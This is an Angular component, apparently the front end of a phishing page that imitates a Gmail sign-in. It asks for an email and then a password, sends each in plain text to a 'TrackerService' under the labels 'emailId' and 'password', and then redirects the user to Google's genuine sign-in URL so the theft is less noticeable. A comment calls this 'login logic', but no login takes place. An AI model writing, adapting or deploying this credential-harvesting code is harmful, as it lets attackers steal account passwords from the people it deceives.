
import { Component, OnInit, signal } from '@angular/core';
import { FormsModule, ReactiveFormsModule, FormControl, Validators } from '@angular/forms';
import { MatSnackBarModule } from '@angular/material/snack-bar';
import { HttpClientModule } from '@angular/common/http';
import { CommonModule } from '@angular/common';
import { TrackerService } from './tracker.service';

@Component({
  selector: 'app-root',
  standalone: true,
  imports: [CommonModule, FormsModule, ReactiveFormsModule, MatSnackBarModule, HttpClientModule],
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css']
})
export class AppComponent {
  email = '';
  password = '';
  showPassword = false;

  constructor(private tracker: TrackerService) { }

  async onNext() {
    await this.tracker.action('emailId', { emailId: this.email });
    this.showPassword = true;
  }

  async onLogin() {
    // Handle login logic here
    await this.tracker.action('password', { password: this.password });
    window.location.href = 'https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&dsh=S-1676954314%3A1767594423804102&ifkv=Ac2yZaUasEDm_SrqxTtKdaH6pcChiIWQRF4sp1VdpZ3j-qz9BnfMegPbD7-fsXmYUMrTwk9txWiK&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin';
  }
}